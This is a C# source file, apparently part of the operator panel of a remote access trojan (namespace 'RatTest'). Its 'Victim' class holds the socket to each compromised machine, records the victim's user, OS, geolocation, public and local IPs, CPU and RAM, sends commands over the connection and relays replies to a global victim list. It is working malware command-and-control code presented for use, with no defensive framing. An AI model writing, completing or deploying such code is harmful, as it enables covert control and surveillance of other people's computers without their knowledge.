using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace RatTest
{
    class Victim : IDisposable
    {
        //Bağlantılar
        public bool isOnline = true;
        public Socket socket;
        public NetworkStream netStream;
        public StreamReader reader;
        public StreamWriter writer;
        //PC Info
        public int ID = 0;
        public string User;
        public string OS;
        //Location
        public string Location;
        public System.Drawing.Point Coordinate;
        public string CountryCode;
        public string Country;
        public string RegionCode;
        public string RegionName;
        //Network
        public string NetIP;
        public string[] LocalIP;
        //Devices
        public string CPU;
        public string RAM;

        public Victim()
        {
            isOnline = false;
        }

        public Victim(Socket socket)
        {
            isOnline = true;
            this.socket = socket;
            netStream = new NetworkStream(this.socket);
            reader = new StreamReader(netStream);
            writer = new StreamWriter(netStream);
            this.netStream.BeginRead(new byte[0], 0, 0, Read, null);
            //this.socket.BeginDisconnect(true, ConnectionClosed, this.socket);

        }

        public void SetInfo(string rawInfo)
        {
            if (rawInfo == null)
                return;

            string[] infos = rawInfo.Split('$');
            User = infos[1];
            OS = infos[2];
            Location = infos[3];
            NetIP = infos[4];
            LocalIP = infos[5].Split('/');
            CPU = infos[6];
            RAM = infos[7];
        }

        public void Send(string data)
        {

            if (data == null)
                return;
            try
            {
                writer.WriteLine(data);
                writer.Flush();
            }
            catch
            {

            }
            
        }

        /*public string Read()
        {
            try
            {
                string temp;
                while(socket.Connected)
                {
                    //temp = reader.Read();
                    System.Windows.Forms.MessageBox.Show("(VictimRead)" + temp);
                }
                return temp;
            }
            catch (IOException e)
            {
                System.Windows.Forms.MessageBox.Show("(VictimRead)"+e.InnerException + "\n" + e.StackTrace);
                return null;
            }
        }*/

        void Read(IAsyncResult ar)
        {
            char[] buff = new char[10000];
            while (socket.Connected)
            {
                try
                {
                    buff = reader.ReadLine().ToCharArray();
                    //int length = reader.Read(buff,0,1000);
                    if (Globals.Victims != null)
                        Globals.Victims.ReceiveMessage(this, new string(buff));
                }
                catch (IOException)
                {
                    //System.Windows.Forms.MessageBox.Show("Readed ERROR");
                    isOnline = false;
                    return;
                }
                
            }
            isOnline = false;
        }

        void ConnectionClosed(IAsyncResult ar)
        {
            socket.EndDisconnect(ar);
            Globals.Victims.Remove(this);
        }

        public void Dispose()
        {
            if (netStream != null)  netStream.Close();
            if (reader != null)     reader.Close();
            if (writer != null)     writer.Close();
        }
    }
}
